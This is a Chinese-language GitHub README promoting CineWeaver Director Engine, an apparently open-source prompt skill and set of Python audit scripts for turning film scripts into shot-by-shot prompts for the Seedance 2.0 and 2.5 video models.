<div align="center">

<img src="assets/icon.svg" width="88" alt="CineWeaver Director Engine" />

# CineWeaver Director Engine

### The Open-Source AI Director Engine for Generative Video

**Stop prompting shot by shot. Start directing.**

把完整剧本转成可直接执行的 AI 视频导演方案：  
**对白编舞 · 人物调度 · 镜头设计 · 连续性控制 · 参考绑定 · 自动审计**

**Community v1.5.5 · Optimized for Seedance 2.0 / 2.5**

[⬇️ **Download v1.5.5**](https://github.com/bedelltracietony26477-create/seedance-director-community/releases/download/v1.5.5/Seedance_Director_Community_v1.5.5.zip)
&nbsp;&nbsp;·&nbsp;&nbsp;
[⭐ **Star CineWeaver**](https://github.com/bedelltracietony26477-create/seedance-director-community/stargazers)
&nbsp;&nbsp;·&nbsp;&nbsp;
[📦 **Release**](https://github.com/bedelltracietony26477-create/seedance-director-community/releases/tag/v1.5.5)
&nbsp;&nbsp;·&nbsp;&nbsp;
[English](README_EN.md)

<br>

[![Release](https://img.shields.io/github/v/release/bedelltracietony26477-create/seedance-director-community?label=release)](https://github.com/bedelltracietony26477-create/seedance-director-community/releases/latest)
[![CI](https://github.com/bedelltracietony26477-create/seedance-director-community/actions/workflows/ci.yml/badge.svg)](https://github.com/bedelltracietony26477-create/seedance-director-community/actions/workflows/ci.yml)
![Seedance](https://img.shields.io/badge/Seedance-2.0%20%7C%202.5-black)
![Python](https://img.shields.io/badge/Python-standard%20library%20only-blue)
![License](https://img.shields.io/badge/license-MIT%20%2B%20CC%20BY%204.0-green)

</div>

---

## 不要再一镜一镜地手写 Prompt

很多 AI 视频工作流解决的是“怎么描述一个画面”。

CineWeaver 解决的是更接近导演现场的问题：

> **这场戏为什么现在切镜？这句话到底该拍谁？人物为什么在这一刻停住？上一段的手机下一段还在不在右手？长对白怎样不站桩？30 秒里到底应该推进几个节拍？**

它把完整剧本转换成一条可重复执行的导演链路：

```text
Script
  ↓
Performance
  ↓
Dialogue Choreography
  ↓
Blocking & Eyelines
  ↓
Camera
  ↓
Reference Binding
  ↓
Continuity
  ↓
Audit
```

**目标不是写得更长，而是让生成模型更清楚地知道：谁在做什么、为什么现在发生、镜头该看哪里，以及下一段从哪里继续。**

---

## 为什么值得下载

| 常见 AI 视频问题 | CineWeaver 的处理方式 |
|---|---|
| 长对白一个近景念到底 | **Dialogue Beat Map**：按信息、逼问、攻击、证据、转折、结论重新组织画面节拍 |
| 谁说话就一直拍谁 | **Reaction Ownership**：优先拍真正被这句话改变的人 |
| 人物动作突然、没有因果 | **Physical Action Chain + Failed Action**：意图 → 启动 → 接触 / 中断 → 结果 |
| 多段生成后人物、道具接不上 | **Blocking + Entry/Exit State + 基础连续性检查** |
| 参考图越多越容易错绑 | **Lightweight Reference Binding**：人物、场景方向、关键道具、音频按段绑定 |
| 2.0 和 2.5 还在用同一种分段逻辑 | **Model-aware Duration Profiles**：按模型能力重新组织时长与节拍 |
| Prompt 看起来专业，但容易漏模块 | **4 个 Python Audit Tools** 自动检查时长、结构与连续性 |

---

## 2 分钟开始使用

### 1. 下载

直接下载最新 Community Skill：

### **[⬇️ Download CineWeaver Community v1.5.5](https://github.com/bedelltracietony26477-create/seedance-director-community/releases/download/v1.5.5/Seedance_Director_Community_v1.5.5.zip)**

然后导入支持 Skills 的环境。入口文件为：

`SKILL.md`

### 2. 粘贴剧本

不需要先自己拆镜头。把完整场景或完整剧情段落交给 CineWeaver。

### 3. 告诉它目标模型

例如：

```text
使用 CineWeaver Director Engine 处理下面这场戏。

目标模型：Seedance 2.5。
保留全部原台词。
重新估算合理时长。
不要站桩式对白。
根据 Reaction Ownership 决定关键台词拍谁。
保持人物、道具、眼线与轴线连续。
输出可直接用于生成的完整版分段提示词。
```

如果不指定模型，Community v1.5.5 默认按 **Seedance 2.0** 的短段逻辑执行。

---

## 使用入口

推荐按下面的流程开始：

**下载 Skill → 导入 → 复制启动提示词 → 粘贴剧本与参考素材 → 指定 Seedance 2.0 / 2.5 → 开始生成。**

- [⚡ Quick Start Prompt｜快速启动提示词](examples/QUICK_START_PROMPT_CN.md)：适合第一次使用、快速测试和普通剧情段落。
- [🎬 Advanced Starter Prompt｜专业导演启动提示词](examples/ADVANCED_STARTER_PROMPT_CN.md)：适合完整一集、复杂场面、多人物、长对白、动作戏和严格连续性任务。

如果不指定模型，Community v1.5.5 默认按 **Seedance 2.0** 的短段逻辑执行。

---

## 两套模型时长逻辑

| Target | 标准分段 | 更适合 |
|---|---:|---|
| **Seedance 2.0** | **8–15 秒** | 高频短剧、单一冲突、快速对白、紧凑动作链 |
| **Seedance 2.5** | **16–30 秒** | 长对白、连续调度、多阶段动作、复杂关系对抗 |

### Seedance 2.0

优先保证：

- 单段目标清晰
- 高频信息推进
- 镜头切换紧凑
- 超过 15 秒继续拆段

### Seedance 2.5

长段不是把两个 15 秒 Prompt 粘在一起。

20 秒以上段落需要维持**一个主要戏剧目标**，并在内部形成约 **2–4 个连续 microbeats**，例如：

```text
建立 → 升级 → 冲击 → 余震
```

剧情边界合理时允许约 **15 秒边界段**。

---

## CineWeaver 的核心导演能力

### 🎭 Dialogue Choreography

长对白不再默认“一个近景从头念到尾”。

CineWeaver 会识别对白内部的语义变化，并把台词、动作、反应和镜头组织成真正的戏剧节拍。

### 👁 Reaction Ownership

关键台词不一定拍说话的人。

系统会问：

> **这一句话真正改变了谁？**

然后把最重要的画面资源交给真正承担变化的人。

### ✋ Failed Action

“没有完成的动作”本身就是表演。

例如：

```text
想跪下 → 屈膝 → 被一句话打断 → 停在半蹲

想挂电话 → 手指靠近按钮 → 听见关键信息 → 手停住

想阻止 → 抬手 → 对方已经完成动作 → 手悬在半空
```

这类动作可以显著增强动作因果、心理压力与镜头张力。

### 🎥 Blocking / Eyeline / 180° Axis

不仅写“人物站着说话”，而是明确：

- 谁在画面左 / 右
- 身体朝向
- 视线目标
- 相对距离
- 前后层级
- 是否跨轴
- 下一镜怎样继续

### 🧩 Lightweight Reference Binding

Community Edition 支持轻量绑定：

- 人物参考
- 场景参考
- 正 / 反打方向
- 关键道具
- 人物声音

每个独立生成段重新建立本地参考编号，降低长项目中的参考错绑概率。

---

## 不是只生成 Prompt，还会审计 Prompt

仓库附带 4 个**零第三方依赖**的 Python 工具：

| Tool | 用途 |
|---|---|
| `dialogue_timing.py` | 估算对白时长与表演余量 |
| `segment_timing_audit.py` | 检查 2.0 / 2.5 分段容量和时长规则 |
| `prompt_audit.py` | 检查输出模块、参考调用和 Prompt 契约 |
| `continuity_audit.py` | 检查相邻分段的人物 / 道具基础连续性 |

快速测试：

```bash
python3 scripts/dialogue_timing.py --text '我不会再退了。' --mode restrained --format markdown
python3 scripts/segment_timing_audit.py examples/segments-seedance2.0.json --format markdown
python3 scripts/segment_timing_audit.py examples/segments-seedance2.5.json --format markdown
python3 scripts/prompt_audit.py examples/quick-prompt.txt --contract quick --format markdown
python3 scripts/continuity_audit.py examples/continuity.json --format markdown
```

所有审计脚本仅使用 Python 标准库。

---

## 它适合谁

CineWeaver Community 更适合：

- AI 短剧导演 / 制作人
- Seedance 视频创作者
- AI 分镜与提示词工程师
- 需要批量处理剧情段落的工作流
- 想让角色、镜头和动作更连续的创作者
- 正在搭建 AI 影视生产 Pipeline 的开发者

如果你只需要生成一张漂亮画面，它可能有些“重”。

如果你需要**连续拍一场戏**，它才开始体现价值。

---

## Community v1.5.5 包含什么

```text
.
├── SKILL.md
├── agents/
├── assets/
├── references/
├── scripts/
├── examples/
├── tests/
└── .github/
```

核心规则包括：

- Exact Dialogue Lock
- Dialogue Beat Map Lite
- Reaction Ownership
- Failed Action
- Short-drama Visual Impact
- Blocking / Eyeline / Axis
- Emotion & Physical Performance
- Camera Grammar
- Seedance 2.0 / 2.5 Duration Profiles
- Lightweight Reference Binding
- Crowd / Sound / Editing
- Quality Gates
- Final Output Contract

---

## Community Edition 的边界

v1.5.5 是一套**完整可用**的开源导演工作流，同时有意保持轻量。

当前 Community Edition 不包含更重型的高级状态系统，例如：

- Character Performance Signature
- Full Semantic Prop State Machine
- Semantic ID Asset Layer
- Quantitative Screen Attention Budget
- Advanced Voice Identity State

这样可以让 Community 版保持更容易理解、修改和二次开发。

---

## ⭐ 如果它帮你少返工一次，欢迎 Star

如果 CineWeaver：

- 减少了你手工拆 Prompt 的时间
- 让长对白不再站桩
- 改善了角色 / 道具 / 镜头连续性
- 或者给你的 AI 视频工作流带来了一条有用规则

### **[⭐ Star CineWeaver on GitHub](https://github.com/bedelltracietony26477-create/seedance-director-community)**

Star 不只是数字。它会帮助更多 AI 视频创作者发现这个项目，也会让我更容易判断哪些能力值得继续优先开放和维护。

如果你发现真实生成失败案例，也欢迎直接提交 [Issue](https://github.com/bedelltracietony26477-create/seedance-director-community/issues)。

---

## Contributing

欢迎提交 Issue 和 Pull Request。

尤其欢迎：

- Seedance 2.0 / 2.5 的真实失败案例
- 不同短剧类型的可复现实例
- 审计脚本误报 / 漏报修复
- 更清晰的 Blocking / Reference Binding / Continuity 规则
- 中英文文档改进

贡献前请阅读 [CONTRIBUTING.md](CONTRIBUTING.md)。

---

## Version

当前公开版本：

**CineWeaver Director Engine · Community v1.5.5**

- [Release v1.5.5](https://github.com/bedelltracietony26477-create/seedance-director-community/releases/tag/v1.5.5)
- [Changelog](CHANGELOG.md)

---

## License

本项目采用双许可：

- **程序代码**（`scripts/`、`tests/` 等）：MIT License，见 [LICENSE-CODE](LICENSE-CODE)
- **Skill 指令 / 方法论 / 文档 / 文字示例**：CC BY 4.0，见 [LICENSE-DOCS](LICENSE-DOCS)

第三方商标、产品名与模型名归各自权利人所有。

---

## Disclaimer

**CineWeaver Director Engine 是独立的非官方社区项目。**

本项目与 ByteDance、Seedance 团队不存在隶属、赞助或官方背书关系。

<div align="center">

### CineWeaver Director Engine

**Orchestrate the scene. Direct the generation.**

[⬇️ Download](https://github.com/bedelltracietony26477-create/seedance-director-community/releases/latest)
·
[⭐ Star](https://github.com/bedelltracietony26477-create/seedance-director-community)
·
[🐛 Report an Issue](https://github.com/bedelltracietony26477-create/seedance-director-community/issues)

**Created & maintained by LERler-Q**

</div>
